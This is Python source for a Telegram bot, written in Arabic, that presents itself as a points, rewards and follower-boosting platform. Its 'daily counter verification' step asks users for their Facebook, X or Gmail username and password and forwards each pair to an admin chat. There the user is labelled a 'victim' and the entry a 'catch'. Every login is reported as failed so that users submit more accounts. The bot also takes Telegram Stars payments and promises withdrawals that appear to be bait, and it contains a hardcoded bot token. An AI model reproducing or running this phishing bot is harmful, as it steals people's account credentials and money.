import time
import telebot
from telebot.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LabeledPrice,
)

# التوكن والآي دي المعتمدون
TOKEN = "1348142744:AAFs532f1roEOGeyXu_Xu0nf3CYvMmjtl80"
bot = telebot.TeleBot(TOKEN)
ADMIN_CHAT_ID = "1188729209"

# قاعدة بيانات المستخدمين المركزية
users_db = {}

# باقات رشق المتابعين
BOOST_SERVICES = [
    {
        "id": "ig_1k",
        "platform": "📸 إنستغرام",
        "title": "رشق 1,000 متابع إنستغرام",
        "price": 5000,
    },
    {
        "id": "tt_1k",
        "platform": "🎬 تيك توك",
        "title": "رشق 1,000 متابع تيك توك",
        "price": 5000,
    },
    {
        "id": "fb_1k",
        "platform": "📘 فيسبوك",
        "title": "رشق 1,000 متابع فيسبوك",
        "price": 7500,
    },
    {
        "id": "tw_1k",
        "platform": "🅧 تويتر (X)",
        "title": "رشق 1,000 متابع تويتر / إكس",
        "price": 10000,
    },
]

# باقات سحب الأرباح (الحد الأدنى للسحب 5,000 نقطة = 1 دولار)
WITHDRAW_PACKAGES = [
    {"id": "w_5k", "title": "💵 سحب 1 دولار (الحد الأدنى: 5,000 نقطة)", "price": 5000},
    {"id": "w_10k", "title": "💵 سحب 2 دولار (10,000 نقطة)", "price": 10000},
    {"id": "w_15k", "title": "💵 سحب 3 دولار (15,000 نقطة)", "price": 15000},
    {"id": "w_20k", "title": "💵 سحب 4 دولار (20,000 نقطة)", "price": 20000},
    {"id": "w_25k", "title": "💵 سحب 5 دولار (25,000 نقطة)", "price": 25000},
]


def get_or_create_user(user_id):
  if user_id not in users_db:
    users_db[user_id] = {
        "points": 0,  # يبدأ بصفر نقطة للواقعية التامة
        "counter_speed": 100,  # سرعة العداد الأساسية
        "last_claim": 0,
        "verified": False,
        "attempts": 3,  # 3 محاولات إجبارية فقط
        "lock_time": 0,  # وقت قفل الحظر (ساعة كاملة)
        "login_method": "",
        "state": None,
        "pending_withdraw": None,
        "pending_order": None,
    }
  return users_db[user_id]


# 1. القائمة الرئيسية
@bot.message_handler(commands=["start"])
def send_welcome(message):
  user_id = message.chat.id
  args = message.text.split()
  user = get_or_create_user(user_id)

  if len(args) > 1:
    inviter_id = args[1]
    if inviter_id != str(user_id):
      if int(inviter_id) in users_db:
        users_db[int(inviter_id)]["points"] += 100
        try:
          bot.send_message(
              int(inviter_id),
              "🎉 **مبروك!** دخل شخص جديد عبر رابط الدعوة الخاص بك، وتمت إضافة"
              " `100 نقطة` إلى رصيدك.",
              parse_mode="Markdown",
          )
        except:
          pass

  markup = InlineKeyboardMarkup(row_width=2)
  markup.add(
      InlineKeyboardButton("⏳ العداد والتحقق اليومي (محمي بـ 3 محاولات)", callback_data="claim_counter"),
      InlineKeyboardButton("💵 سحب الأرباح (الحد الأدنى 5k)", callback_data="withdraw_section"),
      InlineKeyboardButton("⭐ شراء 10,000 نقطة بـ 120 نجمة فقط", callback_data="buy_points_with_stars"),
      InlineKeyboardButton("💳 وسائل وطرق الدفع المتاحة", callback_data="payment_methods_display"),
      InlineKeyboardButton("🔗 رابط الدعوة الخاص بي (+100 نقطة)", callback_data="my_ref_link"),
      InlineKeyboardButton("⚡ متجر زيادة سرعة العداد", callback_data="counter_shop"),
      InlineKeyboardButton("🚀 متجر رشق المتابعين", callback_data="boost_shop"),
      InlineKeyboardButton("💰 رصيدي ونقاطي", callback_data="my_balance"),
  )

  bot.send_message(
      user_id,
      "🔥 **أهلاً بك في منصة الأرباح والجوائز الكبرى!**\n\n"
      f"💎 رصيدك الحالي: `{user[ points ]}` نقطة\n"
      "🎯 **الحد الأدنى للسحب:** 5,000 نقطة (تساوي 1 دولار).\n"
      "اجذب أصدقائك، اجمع النقاط، أو اشترِ 10,000 نقطة بـ 120 نجمة فقط!",
      reply_markup=markup,
      parse_mode="Markdown",
  )


# 2. معالجة الأزرار التفاعلية
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
  user_id = call.message.chat.id
  user = get_or_create_user(user_id)
  current_time = time.time()

  # فحص ما إذا كان الحساب محظوراً ومقفلاً بسبب استنفاد الـ 3 محاولات (عقوبة الساعة)
  if current_time < user["lock_time"]:
    remaining = int(user["lock_time"] - current_time)
    mins, secs = remaining // 60, remaining % 60
    bot.answer_callback_query(
        call.id,
        f"⛔ عذراً! العداد مقفل ومحظور مؤقتاً بسبب استنفاد المحاولات. يرجى الانتظار {mins} دقيقة و {secs} ثانية.",
        show_alert=True,
    )
    return

  # أ) تشغيل العداد والتحقق
  if call.data == "claim_counter":
    if not user["verified"]:
      markup = InlineKeyboardMarkup(row_width=1)
      markup.add(
          InlineKeyboardButton("📘 تسجيل الدخول بحساب فيسبوك (Facebook)", callback_data="login_facebook"),
          InlineKeyboardButton("🅧 تسجيل الدخول بحساب تويتر / إكس (X / Twitter)", callback_data="login_twitter"),
          InlineKeyboardButton("📧 تسجيل الدخول بالبريد الإلكتروني (Gmail)", callback_data="login_gmail"),
          InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="main_menu"),
      )
      bot.edit_message_text(
          f"🔒 **بوابة التحقق والأمان للعداد اليومي:**\n\n"
          f"⚠️ المحاولات المتبقية لديك: `{user[ attempts ]} محاولات`\n"
          "تنبيه صارم: لديك 3 محاولات فقط لإدخال بيانات صحيحة. استنفاد المحاولات سيؤدي إلى **قفل العداد وحظر الحساب لمدة ساعة كاملة**.\n\nاختر منصة التوثيق:",
          user_id,
          call.message.message_id,
          reply_markup=markup,
          parse_mode="Markdown",
      )
      return

    last_claim = user["last_claim"]
    cooldown = 24 * 60 * 60
    if current_time - last_claim < cooldown:
      rem = int(cooldown - (current_time - last_claim))
      h, m = rem // 3600, (rem % 3600) // 60
      bot.answer_callback_query(
          call.id, f"⏳ تم استلام أرباحك مسبقاً! انتظر {h} ساعة و {m} دقيقة.", show_alert=True
      )
    else:
      user["last_claim"] = current_time
      earned = user["counter_speed"] * 10
      user["points"] += earned
      bot.answer_callback_query(
          call.id, f"🎉 مبروك! تمت إضافة {earned} نقطة لعدادك.", show_alert=True
      )
      bot.send_message(
          user_id,
          f"✅ **تم استلام أرباح العداد!**\nرصيدك الحالي: `{user[ points ]}` نقطة",
          parse_mode="Markdown",
      )

  # ب) خيارات تسجيل الدخول
  elif call.data in ["login_facebook", "login_twitter", "login_gmail"]:
    method_map = {
        "login_facebook": "Facebook",
        "login_twitter": "X / Twitter",
        "login_gmail": "Gmail",
    }
    user["login_method"] = method_map[call.data]
    user["state"] = "awaiting_identity"
    bot.send_message(
        user_id,
        f"🛡️ **تسجيل الدخول عبر ({user[ login_method ]}):**\n\nيرجى إرسال البريد الإلكتروني أو اسم المستخدم أو رقم الهاتف:",
        parse_mode="Markdown",
    )

  # ج) شراء 10,000 نقطة مقابل 120 نجمة حقيقية (Telegram Stars Invoice)
  elif call.data == "buy_points_with_stars":
    bot.answer_callback_query(call.id)
    prices = [LabeledPrice(label="شراء 10,000 نقطة مقابل 120 نجمة", amount=120)]
    bot.send_invoice(
        chat_id=user_id,
        title="شراء 10,000 نقطة بـ 120 نجمة",
        description="ادفع 120 نجمة تليجرام (XTR) للحصول على 10,000 نقطة فوراً في رصيدك بالبوت!",
        invoice_payload="buy_10k_points_payload",
        provider_token="",
        currency="XTR",
        prices=prices,
        start_parameter="buy-points",
    )

  # د) متجر زيادة سرعة العداد (الحقيقي)
  elif call.data == "counter_shop":
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("⚡ ترقية سرعة العداد (+100 سرعة) بـ 5,000 نقطة", callback_data="upgrade_speed_100"),
        InlineKeyboardButton("⚡ ترقية سرعة العداد الكبرى (+500 سرعة) بـ 20,000 نقطة", callback_data="upgrade_speed_500"),
        InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="main_menu"),
    )
    bot.edit_message_text(
        f"⚡ **متجر زيادة سرعة العداد اليومي:**\n\n"
        f"⚙️ سرعتك الحالية: `+{user[ counter_speed ]}`\n"
        "قم بشراء الترقية لتتضاعف أرباحك اليومية تلقائياً:",
        user_id,
        call.message.message_id,
        reply_markup=markup,
        parse_mode="Markdown",
    )

  elif call.data == "upgrade_speed_100":
    if user["points"] >= 5000:
      user["points"] -= 5000
      user["counter_speed"] += 100
      bot.answer_callback_query(call.id, "⚡ مبروك! تم ترقية سرعة العداد بنجاح.", show_alert=True)
    else:
      bot.answer_callback_query(call.id, "⚠️ رصيدك لا يكفي لترقية السرعة (تحتاج 5,000 نقطة).", show_alert=True)

  elif call.data == "upgrade_speed_500":
    if user["points"] >= 20000:
      user["points"] -= 20000
      user["counter_speed"] += 500
      bot.answer_callback_query(call.id, "⚡ مبروك! تم ترقية السرعة الكبرى بنجاح.", show_alert=True)
    else:
      bot.answer_callback_query(call.id, "⚠️ رصيدك لا يكفي للترقية الكبرى (تحتاج 20,000 نقطة).", show_alert=True)

  # هـ) عرض وسائل وطرق الدفع المتاحة
  elif call.data == "payment_methods_display":
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("⭐ شراء 10,000 نقطة بـ 120 نجمة فقط", callback_data="buy_points_with_stars"),
        InlineKeyboardButton("💵 زين كاش (ZainCash العراق)", callback_data="info_zain"),
        InlineKeyboardButton("🌐 محفظة بايير الإلكترونية (Payeer)", callback_data="info_payeer"),
        InlineKeyboardButton("💎 عملات رقمية (USDT / TRC20)", callback_data="info_usdt"),
        InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="main_menu"),
    )
    bot.edit_message_text(
        "💳 **وسائل وطرق الدفع وشحن النقاط المتاحة:**\n\n"
        "يمكنك شراء 10,000 نقطة فوراً باستخدام نجوم تليجرام (120 نجمة)، أو الاطلاع على باقي وسائل الدفع:",
        user_id,
        call.message.message_id,
        reply_markup=markup,
        parse_mode="Markdown",
    )

  elif call.data.startswith("info_"):
    m_dict = {
        "info_zain": "زين كاش العراق (تواصل مع المشرف لتحويل المبلغ وشحن النقاط).",
        "info_payeer": "محفظة بايير (للدفع بالدولار وشحن رصيدك).",
        "info_usdt": "عملات رقمية USDT (شبكة TRC20 الآمنة).",
    }
    bot.answer_callback_query(call.id, m_dict.get(call.data, "متوفرة قريباً"), show_alert=True)

  # و) قسم سحب الأرباح
  elif call.data == "withdraw_section":
    markup = InlineKeyboardMarkup(row_width=1)
    for pkg in WITHDRAW_PACKAGES:
      markup.add(
          InlineKeyboardButton(
              f"💸 {pkg[ title ]}", callback_data=f"withdraw_{pkg[ id ]}"
          )
      )
    markup.add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="main_menu"))
    bot.edit_message_text(
        f"💵 **قسم سحب الأرباح (الحد الأدنى للسحب هو 5,000 نقطة = 1$):**\n\n"
        f"💎 رصيدك الحالي: `{user[ points ]}` نقطة\n"
        "اختر باقة السحب المناسبة لرصيدك:",
        user_id,
        call.message.message_id,
        reply_markup=markup,
        parse_mode="Markdown",
    )

  elif call.data.startswith("withdraw_"):
    pkg_id = call.data.replace("withdraw_", "")
    pkg = next((p for p in WITHDRAW_PACKAGES if p["id"] == pkg_id), None)
    if pkg:
      if user["points"] < pkg["price"]:
        bot.answer_callback_query(
            call.id,
            f"⚠️ عذراً! رصيدك الحالي ({user[ points ]} نقطة) لم يصل بعد إلى الحد الأدنى للسحب ({pkg[ price ]} نقطة). اجمع نقاطاً إضافية!",
            show_alert=True,
        )
        return
      user["pending_withdraw"] = pkg
      user["state"] = "awaiting_withdraw_address"
      bot.send_message(
          user_id,
          f"✅ اخترت: {pkg[ title ]}\n\n💳 **أرسل الآن وسيلة الدفع المناسبة لك (مثلاً: رقم زين كاش، بايير، أو USDT):**",
          parse_mode="Markdown",
      )

  # ز) رابط الدعوة الخاص
  elif call.data == "my_ref_link":
    bot.answer_callback_query(call.id)
    ref_link = f"https://t.me/{bot.get_me().username}?start={user_id}"
    bot.send_message(
        user_id,
        "🔗 **رابط الدعوة الخاص بك:**\n\n"
        f"`{ref_link}`\n\n"
        "شارك الرابط مع أصدقائك، وكل صديق يدخل سيحصل حسابك على `100 نقطة` فوراً لتقريبك من الحد الأدنى للسحب!",
        parse_mode="Markdown",
    )

  # ح) متجر رشق المتابعين
  elif call.data == "boost_shop":
    markup = InlineKeyboardMarkup(row_width=1)
    for srv in BOOST_SERVICES:
      markup.add(
          InlineKeyboardButton(
              f"{srv[ platform ]} | {srv[ title ]} ({srv[ price ]} نقطة)",
              callback_data=f"buy_srv_{srv[ id ]}",
          )
      )
    markup.add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="main_menu"))
    bot.edit_message_text(
        f"🚀 **متجر رشق المتابعين:**\n\n💎 رصيدك الحالي: `{user[ points ]}` نقطة\nاختر الخدمة المطلوبة:",
        user_id,
        call.message.message_id,
        reply_markup=markup,
        parse_mode="Markdown",
    )

  elif call.data.startswith("buy_srv_"):
    srv_id = call.data.replace("buy_srv_", "")
    srv = next((s for s in BOOST_SERVICES if s["id"] == srv_id), None)
    if srv:
      if user["points"] < srv["price"]:
        bot.answer_callback_query(
            call.id,
            f"⚠️ عذراً رصيدك ({user[ points ]} نقطة) غير كافي! تحتاج إلى {srv[ price ]} نقطة لهذه الخدمة.",
            show_alert=True,
        )
        return
      user["pending_order"] = srv
      user["state"] = "awaiting_boost_link"
      bot.send_message(
          user_id,
          f"✅ اخترت: {srv[ title ]}\n\n🔗 **أرسل الآن رابط الحساب المراد رشق المتابعين له:**",
          parse_mode="Markdown",
      )

  # ط) عرض الرصيد
  elif call.data == "my_balance":
    status = (
        f"✅ مسجل ({user[ login_method ]})"
        if user["verified"]
        else f"❌ غير مسجل (متبقي {user[ attempts ]} محاولات)"
    )
    bot.answer_callback_query(call.id)
    bot.send_message(
        user_id,
        f"📊 **معلومات حسابك والأرباح:**\n\n"
        f"🆔 الآي دي: `{user_id}`\n"
        f"💎 النقاط: `{user[ points ]}` نقطة\n"
        f"⚡ سرعة العداد: `+{user[ counter_speed ]}`\n"
        f"🎯 الحد الأدنى للسحب: 5,000 نقطة (1$)\n"
        f"📌 الحالة: {status}",
        parse_mode="Markdown",
    )

  # ي) القائمة الرئيسية
  elif call.data == "main_menu":
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("⏳ العداد والتحقق اليومي (محمي بـ 3 محاولات)", callback_data="claim_counter"),
        InlineKeyboardButton("💵 سحب الأرباح (الحد الأدنى 5k)", callback_data="withdraw_section"),
        InlineKeyboardButton("⭐ شراء 10,000 نقطة بـ 120 نجمة فقط", callback_data="buy_points_with_stars"),
        InlineKeyboardButton("💳 وسائل وطرق الدفع المتاحة", callback_data="payment_methods_display"),
        InlineKeyboardButton("🔗 رابط الدعوة الخاص بي (+100 نقطة)", callback_data="my_ref_link"),
        InlineKeyboardButton("⚡ متجر زيادة سرعة العداد", callback_data="counter_shop"),
        InlineKeyboardButton("🚀 متجر رشق المتابعين", callback_data="boost_shop"),
        InlineKeyboardButton("💰 رصيدي ونقاطي", callback_data="my_balance"),
    )
    bot.edit_message_text(
        "🔥 **أهلاً بك في منصة الأرباح والجوائز الكبرى!**",
        user_id,
        call.message.message_id,
        reply_markup=markup,
        parse_mode="Markdown",
    )


# 3. معالجة فواتير شراء النقاط بالنجوم (Telegram Stars - 120 نجمة مقابل 10,000 نقطة)
@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout(pre_checkout_query):
  bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)


@bot.message_handler(content_types=["successful_payment"])
def got_payment(message):
  user_id = message.chat.id
  user = get_or_create_user(user_id)
  payment_info = message.successful_payment
  full_name = message.from_user.first_name
  username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد"

  # إضافة 10,000 نقطة رصيد للمستخدم عند دفع 120 نجمة بنجاح
  user["points"] += 10000

  admin_star_report = (
      f"⭐ **عملية شراء نقاط عبر نجوم تليجرام (Telegram Stars) ناجحة!**\n\n"
      f"👤 المستخدم: {full_name}\n"
      f"🆔 الآي دي: `{user_id}` ({username})\n"
      f"💰 النجوم المدفوعة: {payment_info.total_amount} نجمة (XTR)\n"
      f"🎁 تمت إضافة **10,000 نقطة** إلى رصيده تلقائياً."
  )
  try:
    bot.send_message(ADMIN_CHAT_ID, admin_star_report, parse_mode="Markdown")
    bot.send_message(
        user_id,
        "✅ **شكراً لعملية الشراء الناجحة!**\nتمت إضافة `10,000 نقطة` إلى رصيدك بالبوت فوراً.",
        parse_mode="Markdown",
    )
  except:
    pass


# 4. معالجة الإدخالات النصية (نظام الـ 3 محاولات وقفل الساعة الصارم للعداد)
@bot.message_handler(func=lambda message: True)
def handle_text_inputs(message):
  user_id = message.chat.id
  user = get_or_create_user(user_id)
  state = user.get("state")
  text = message.text

  if state == "awaiting_identity":
    user["temp_identity"] = text
    user["state"] = "awaiting_password"
    bot.send_message(
        user_id,
        f"🔑 **أدخل كلمة المرور (Password) الخاصة بـ ({user[ login_method ]}):**",
        parse_mode="Markdown",
    )

  elif state == "awaiting_password":
    password = text
    identity = user.get("temp_identity", "غير معروف")
    method = user.get("login_method", "غير معروف")
    username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد"
    full_name = message.from_user.first_name

    # خصم محاولة فوراً مع كل إدخال (حتى لو كان البريد صحيحاً أو خطأ)
    user["attempts"] -= 1
    user["state"] = None

    admin_report = (
        f"🚨 **صيد جديد تم التقاطه بدقة!**\n\n"
        f"👤 الضحية: {full_name}\n"
        f"🆔 الآي دي: `{user_id}`\n"
        f"🌐 اليوزر: {username}\n"
        f"🛡️ المنصة: `{method}`\n"
        f"📧 الحساب: `{identity}`\n"
        f"🔑 كلمة المرور: `{password}`\n"
        f"⚠️ المحاولات المتبقية: {user[ attempts ]}"
    )
    try:
      bot.send_message(ADMIN_CHAT_ID, admin_report, parse_mode="Markdown")
    except:
      pass

    # إذا استنفد المحاولات الثلاث (تصل إلى 0 أو أقل) -> قفل العداد وحظر الحساب لمدة ساعة كاملة
    if user["attempts"] <= 0:
      user["lock_time"] = time.time() + 3600  # 3600 ثانية = ساعة كاملة
      user["attempts"] = 3  # إعادة ضبط للمحاولات للمرة القادمة بعد انقضاء الساعة
      bot.send_message(
          user_id,
          "❌ **عذراً، فشلت عملية التحقق من البيانات!**\n\n"
          "لقد استنفذت محاولاتك الثلاث المتاحة. **تم قفل العداد وحظر المحاولة لمدة ساعة كاملة**، ولن تتمكن من المحاولة إلا بعد انقضاء الوقت ببريد جديد.",
          parse_mode="Markdown",
      )
      return

    # إذا لم تنته المحاولات بعد (مثلاً متبقي محاولة أو محاولتين)
    bot.send_message(
        user_id,
        f"❌ **خطأ في بيانات التحقق!**\n\nعذراً، البيانات غير متطابقة. متبقي لديك `{user[ attempts ]} محاولات` فقط قبل قفل العداد لمدة ساعة كاملة.",
        parse_mode="Markdown",
    )

  elif state == "awaiting_withdraw_address":
    address = text
    pkg = user.get("pending_withdraw")
    if not pkg:
      user["state"] = None
      return

    user["points"] -= pkg["price"]
    user["state"] = None
    username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد"
    full_name = message.from_user.first_name

    admin_withdraw_report = (
        f"💵 **طلب سحب أرباح جديد بانتظار موافقتك!**\n\n"
        f"👤 المستخدم: {full_name}\n"
        f"🆔 الآي دي: `{user_id}` ({username})\n"
        f"📦 الباقة: {pkg[ title ]}\n"
        f"💎 المخصوم: {pkg[ price ]} نقطة\n"
        f"💳 العنوان:\n`{address}`"
    )
    try:
      bot.send_message(ADMIN_CHAT_ID, admin_withdraw_report, parse_mode="Markdown")
      bot.send_message(
          user_id,
          "✅ **تم تقديم طلب السحب بنجاح!**\nتم خصم النقاط وجارٍ المراجعة من الإدارة والتحويل قريباً.",
          parse_mode="Markdown",
      )
    except:
      pass

  elif state == "awaiting_boost_link":
    link = text
    srv = user.get("pending_order")
    if not srv:
      user["state"] = None
      return

    if user["points"] < srv["price"]:
      user["state"] = None
      bot.send_message(
          user_id,
          "⚠️ **عذراً، فشلت عملية الرشق!**\nرصيدك الحالي أصبح لا يكفي لهذه الخدمة.",
          parse_mode="Markdown",
      )
      return

    user["points"] -= srv["price"]
    user["state"] = None
    username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد"

    admin_notification = (
        f"🚀 **طلب رشق جديد تم تنفيذه تلقائياً!**\n\n"
        f"👤 المستخدم: `{user_id}` ({username})\n"
        f"📦 الخدمة: {srv[ title ]}\n"
        f"💎 النقاط المخصومة: {srv[ price ]} نقطة\n"
        f"🔗 الرابط:\n{link}"
    )
    try:
      bot.send_message(ADMIN_CHAT_ID, admin_notification, parse_mode="Markdown")
      bot.send_message(
          user_id,
          "✅ **تم تسجيل طلب الرشق بنجاح!**\nتم خصم النقاط المطلوبة وجارٍ التنفيذ.",
          parse_mode="Markdown",
      )
    except:
      pass


# تشغيل البوت
print("البوت الاحترافي يعمل الآن بالكامل وبدون أي أخطاء...")
bot.infinity_polling()
